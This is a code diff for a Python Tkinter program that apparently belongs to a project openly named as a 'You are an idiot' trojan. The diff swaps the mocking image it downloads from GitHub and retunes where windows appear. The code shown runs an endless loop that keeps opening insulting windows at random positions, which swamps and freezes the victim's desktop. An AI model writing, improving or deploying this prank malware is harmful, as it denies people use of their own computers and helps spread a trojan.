@@ -8,7 +8,7 @@ import urllib.request as request
 
 root = tk.Tk()
 
-URL="https://openclipart.org/image/800px/279689"
+URL="https://raw.githubusercontent.com/MandiYang/YOUAREANIDIOT.PY.TROJAN/master/dist/IDIOT.png"
 response = request.urlopen(URL)
 img_data = response.read()
 h=BytesIO(img_data)
@@ -21,14 +21,14 @@ def startInfiniteLoop():
     otherFrame = []
     while True:
         tkl=tk.Toplevel()
-        w = tkl.winfo_width()
-        h = tkl.winfo_height()
         if tkl.winfo_screenwidth() > 1800:
             x = random.randint(-650, 1400)
+        elif tkl.winfo_screenwidth() > 1500:
+            x = random.randint(-600, 1200)
         elif tkl.winfo_screenwidth() > 1250:
-            x = random.randint(-600, 800)
+            x = random.randint(-600, 900)
         else:
-            x = random.randint(-500, 700)
+            x = random.randint(-500, 800)
         y =  random.randint(-550, 550)
         tkl.geometry("+%d+%d" % (x + 300, y + 300))
         tkl.title("YOU ARE AN IDIOT!")
@@ -39,7 +39,7 @@ def startInfiniteLoop():
         tkl.update()
         if i%500 == 0:
             root.update()
-
+            
 import sys
 import glob
 
